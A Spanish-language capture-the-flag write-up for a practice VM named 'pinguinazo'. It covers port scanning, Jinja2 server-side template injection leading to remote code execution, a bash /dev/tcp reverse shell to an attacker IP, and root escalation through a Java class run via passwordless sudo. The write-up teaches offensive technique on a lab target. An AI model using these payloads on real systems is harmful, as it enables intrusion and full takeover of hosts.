# 🛡️ Write-Up: pinguinazo.zip
## Dificultad: Fácil

Objetivo: Obtener acceso inicial y escalar privilegios.

🔍 Enumeración
Se descomprime el archivo pinguinazo.zip y se ejecuta la máquina virtual.

![DENTRO](Images/ENTRAMOS.png)

Se realiza un escaneo completo de puertos con Nmap:

```Bash
nmap -p- -sC -sV --open -sS -n -Pn <IP>
```

![NMAP](Images/NMAP.png)

Parámetros utilizados:

-p-: escaneo de todos los puertos

-sC: scripts por defecto

-sV: detección de versiones

--open: muestra solo puertos abiertos

-sS: SYN scan (sigiloso)

-n: evita resolución DNS

-Pn: omite ping previo

📌 Resultados

Puerto 5000

Fijemonos en esto.

```
5000/tcp open  http  Werkzeug httpd 3.0.1 (Python 3.12.3)
```

Puerto 5000 abierto
Servicio: HTTP (web)
Servidor: Werkzeug
Lenguaje: Python

Werkzeug: Librería de Python que se usa para crear servidores web.
Muy probablemente, sea una app de python hecha con Flask (casi seguro) corriendo en modo desarrollo. Veremos si es vulnerable a RCE (ejecución remota de código)
Al ser una app web, lo primero que haremos es colocarla en el navegador, a fin de observar si aparece algun formulario web. 

```bash
http://IP:5000
```

![FORMULARIO](Images/formulario.png)

Efectivamente, es un formulario. Ahora debemos verificar si es vulnerable a SSTI (Server Side Template Injection). Esta consiste en que el servidor procesa el codigo que inyectamos en un template. Para verificarlo, colocamos el siguiente código en el formulario

```python
{{ 7*7 }}
```

![49](Images/49.png)

Efectivamente, es vulnerable a SSTI. Observamos que nos resolvió la multiplicación brindada, lo cual significa que el servidor web procesa los códigos que inyectamos en el formulario. Esto nos permitirá aprovecharnos del mismo para lograr el ingreso. Colocamos lo siguiente para ver si podemos obtener alguna información de la configuración del sistema.

```python
{{config}}
```

![Config](Images/config.png)

Bien, observando detenidamente, obtuvimos lo que necesitamos.

```python
'DEBUG': True
```

La aplicacón corre en modo DEBUG, esto se traduce a errores detallados, consola interactiva y exposición de internals. Tambien observamos:

```python
'SECRET_KEY': None
```

Esto signifca una mala configuración, o app muy basica/vulnerable. Vamos un poco mas allá con el siguiente comando.

```python
{{ self.__init__.__globals__ }}
```

![entorno](Images/entornopython.png)

Este nos dió acceso a todo el entorno global de python. Ahora colocaremos un comando que es CLAVE en los intentos de vulnerar este tipo de vulnerabilidades.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![Import](Images/salidaimportos.png)

Desglose:

{{ ... }}: Sintaxis de Jinja2. Todo lo que está dentro se evalúa como código. Es lo que permite la SSTI.
self: Referencia al objeto actual del template.
.__init__: Método constructor del objeto. No lo usamos por sí mismo, sino para seguir navegando.
.__globals__: Muy importante. Nos da acceso a todas las variables globales del entorno Python. 
.__builtins__: Acceso a funciones internas de Python, como print, open, __import__, etc. Clave para importar módulos.
.__import__('os'): Importa el módulo os, el cual sirve para ejecutar comandos e  interactuar con el sistema operativo.
.popen('id'): Ejecuta el comando id y devuelve un ''pipe'' (flujo de salida).
.read(): Lee la salida del comando. 

Basicamente, se explotó una vulnerabilidad SSTI en Jinja2 que permitió acceder al contexto interno del template. A través de la cadena self.__init__.__globals__.__builtins__, se obtuvo acceso a funciones internas de Python, incluyendo __import__, lo que permitió importar el módulo os. Finalmente, se utilizó os.popen() para ejecutar comandos del sistema y obtener su salida, logrando ejecución remota de código (RCE). 

Sobre el resultado

```python
uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)
```

Nos dice con qué usuario estamos ejecutando los comandos. Somos pinguinazo, pertenecientes al grupo pinguinazo. No somos root.
Ya estamos en post explotación, veamos que permisos tenemos a fin de iniciar la escalada de privilegios.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('sudo -l').read() }}
```

![sudo](Images/sudo-l.png)

```
(ALL) NOPASSWD: /usr/bin/java
```

Un regalo. Significa que podemos ejecutar Java como root sin contraseña. 

Antes de continuar, podemos conectarnos al formulario desde la terminal, aprovechando la inyección realizada, a fin de trabajar mas cómodos. 
Abrimos una terminal, y ponenos nuestro netcat a la escucha mediante el Puerto 4444.

```Bash
nc -lvnp 4444
```

Inyectamos el siguiente codigo en el formulario web.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read() }}
```

Desglose de payload colocado.

1- bash -c: Le dice al sistema que ejecute lo que sigue como un comando de Bash.

2- bash -i: Inicia una Bash interactiva (para que espere comandos y devuelva prompts).

3- >& /dev/tcp/172.17.0.1/4444: Esto redirige la salida estándar (lo que verías en pantalla) y la salida de errores hacia un socket de red TCP apuntando a tu IP y puerto. En Linux, /dev/tcp/ es un mecanismo virtual para abrir conexiones de red como si fueran archivos.

4- 0>&1: Redirige la entrada estándar (lo que vos escribís) al mismo lugar donde se fue la salida. Esto cierra el ciclo: lo que tipeás en tu Netcat viaja por la red, entra a la Bash de la víctima, se ejecuta, y el resultado vuelve a tu pantalla.

![netcat](Images/netcat.png)

Logramos conectarnos al formulario web vulnerable desde nuestra terminal. Ahora iniciamos escalada de privilegios. 

Lo que vamos a hacer es, basicamente, crear un archivo que aproveche y capture los permisos que el sistema operativo nos brinda. Este archivo abrirá una bash interactiva que herede todo el poder de quien la ejecute. 

```Bash
echo -e "import java.io.IOException;\npublic class Escalada {\n    public static void main(String[] args) {\n        try {\n            new ProcessBuilder(\"/bin/bash\", \"-p\").inheritIO().start().waitFor();\n        } catch (Exception e) {}\n    }\n}" > /tmp/Escalada.java
```
Desglose, diviendo el código en dos etapas:

## Capa de Bash

```Bash
echo -e "..." > /tmp/Escalada.java
```

1- echo: Utilidad nativa de Linux diseñada para imprimir texto en la salida.

2- -e: Muy importante. Habilita la interpretación de los caracteres de escape con barra invertida (como \n). Sin este flag, echo escribiría literalmente la secuencia de caracteres \n en lugar de generar una nueva línea.

3- > (Operador de Redirección): Toma el flujo de texto generado por echo y lo redirige hacia un archivo físico en el disco (/tmp/Escalada.java). Si el archivo no existe, lo crea; si ya existe, lo sobrescribe por completo.

4- /tmp/: Se elige este directorio porque es una carpeta temporal que posee permisos de lectura y escritura globales (rwx) para cualquier usuario sin privilegios, como el que somos.

## Capa de Java

```Java
import java.io.IOException;

public class Escalada {
    public static void main(String[] args) {
        try {
            new ProcessBuilder("/bin/bash", "-p").inheritIO().start().waitFor();
        } catch (Exception e) {}
    }
}
```

import java.io.IOException;: Importa la clase de excepciones necesaria para el manejo de procesos del sistema. Si el entorno del sistema operativo falla al intentar spawnear la shell, Java necesita esta clase para gestionar el error.

public class Escalada: Define la clase principal. En Java, el nombre de la clase pública debe coincidir exactamente con el nombre del archivo (Escalada.java).

public static void main(String[] args): Es el punto de entrada estándar (Entry Point) que busca la Máquina Virtual de Java (JVM) para comenzar la ejecución del programa.

try { ... } catch (Exception e) {}: Un bloque de control de excepciones vacío. En entornos de explotación, se usa para compactar el código y evitar que cualquier error inesperado aborte la ejecución o genere logs ruidosos en la consola.

new ProcessBuilder("/bin/bash", "-p"): Esta es la API nativa de Java encargada de interactuar con el sistema operativo para crear procesos. Se le pasan dos argumentos:

/bin/bash: El binario de la shell que queremos ejecutar.

"-p": El flag de modo privilegiado (Privileged mode). Previene que la Bash verifique la diferencia entre el UID real y el UID efectivo, impidiendo que se despoje de los privilegios de root heredados del comando sudo.

.inheritIO(): Redirige los canales de entrada, salida y error estándar (stdin, stdout, stderr) del nuevo subproceso (la Bash) hacia el proceso padre (Java). Como el proceso de Java está acoplado a tu terminal de Netcat, este método "pega" la nueva shell de root directamente a tu pantalla actual.

.start(): Envía la señal al sistema operativo para arrancar efectivamente el proceso de la Bash.

.waitFor(): Le ordena al hilo principal de Java que se quede congelado y en espera mientras la Bash esté activa. Esto evita que el programa Java termine abruptamente, lo que destruiría la shell de root inmediatamente después de crearla.

Perfecto, ahora compilamos el archivo creado.

```Bash
javac /tmp/Escalada.java
```
Esto es necesario, debido a que Java no es como Python (que lee código de texto y lo ejecuta inmediatamente). Lo que hace el compilador es leer el código en texto plano y traducirlo a Bytecode (lenguaje de bajo nivel que solo la Maquina Virtual de Java interpreta). Esto generó un nuevo archivo llamado Escalada.class.

Procedemos a ejecutar con Sudo. 

```Bash
sudo /usr/bin/java -cp . Escalada
```

![ROOT](Images/ROOT.png)

Somos root. 
